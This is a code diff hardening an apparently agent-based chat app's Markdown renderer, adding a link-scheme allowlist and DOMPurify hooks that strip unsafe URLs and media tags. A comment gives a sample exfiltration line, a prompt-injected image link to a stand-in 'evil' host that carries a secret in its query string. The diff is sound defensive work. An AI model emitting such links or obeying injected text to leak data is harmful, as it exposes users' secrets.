@@ -1,5 +1,5 @@
 import { Marked } from "marked";
-import DOMPurify from "dompurify";
+import createDOMPurify, { type DOMPurify } from "dompurify";
 import { getLang, t } from "./i18n";
 import { remoteImageHost } from "./remote-image";
 import { cleanWorkdirPath, filePathOf, isImagePath, isLocalFilePath, isWorkdirPath, mediaKindOf } from "./files";
@@ -16,6 +16,16 @@ let waited = false;
 
 const escapeHtml = (s: string) =>
 	s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+
+/** External schemes a rendered message may open: web pages and mail, matching the `open-url` extension policy. */
+export function isSafeExternalUrl(href: string): boolean {
+	try {
+		const { protocol } = new URL(href);
+		return protocol === "http:" || protocol === "https:" || protocol === "mailto:";
+	} catch {
+		return false;
+	}
+}
 
 /** A picture on the server: Markdown.svelte fetches it with the token and swaps this placeholder for the image. */
 function wdImage(href: string, text: string): string {
@@ -55,6 +65,7 @@ md.use({
 			if (kind) return wdMedia(href, text, kind);
 			// A relative link is a file in the session's working directory (the agent wrote it): preview it in the app.
 			if (isWorkdirPath(href)) return `<a href="#" class="wd-file"${t} data-file="${escapeHtml(cleanWorkdirPath(href))}">${inner}</a>`;
+			if (!isSafeExternalUrl(href)) return inner;
 			return `<a href="${escapeHtml(href)}"${t} data-ext rel="noopener noreferrer">${inner}</a>`;
 		},
 		// A remote image is fetched the moment it is in the DOM, so a prompt-injected `![](https://evil/?d=<secret>)`
@@ -82,11 +93,32 @@ md.use({
 	},
 });
 
-DOMPurify.addHook("afterSanitizeAttributes", (node) => {
-	if (node.tagName === "A") {
-		node.setAttribute("rel", "noopener noreferrer");
+const SAFE_URI_REGEXP = /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i;
+
+let cachedWindow: unknown;
+let cachedPurifier: DOMPurify | undefined;
+
+function purifier(): DOMPurify {
+	if (!cachedPurifier || cachedWindow !== globalThis.window) {
+		cachedWindow = globalThis.window;
+		cachedPurifier = createDOMPurify(globalThis.window as unknown as Parameters<typeof createDOMPurify>[0]);
+		cachedPurifier.addHook("afterSanitizeAttributes", (node) => {
+			if (node.tagName?.toUpperCase() === "A") {
+				if (!node.hasAttribute("data-file")) {
+					const href = node.getAttribute("href") ?? "";
+					if (!isSafeExternalUrl(href)) {
+						node.removeAttribute("href");
+						node.removeAttribute("data-ext");
+						return;
+					}
+					node.setAttribute("data-ext", "");
+				}
+				node.setAttribute("rel", "noopener noreferrer");
+			}
+		});
 	}
-});
+	return cachedPurifier;
+}
 
 const cache = new Map<string, string>();
 
@@ -105,7 +137,8 @@ export function renderMarkdown(src: string, opts: { cache?: boolean } = {}): str
 	const store = opts.cache ?? true;
 	waited = false;
 	parseRuns.n++;
-	const html = groupPictures(DOMPurify.sanitize(md.parse(src, { async: false }) as string, {
+	const html = groupPictures(purifier().sanitize(md.parse(src, { async: false }) as string, {
+		ALLOWED_URI_REGEXP: SAFE_URI_REGEXP,
 		ADD_ATTR: ["data-copy", "data-ext", "data-img-src", "data-alt", "data-file", "data-wd-src", "data-kind", "data-hl-wait"],
 		FORBID_TAGS: ["style", "form", "input", "iframe", "object", "embed", "img", "picture", "source", "video", "audio", "link", "meta"],
 	}));
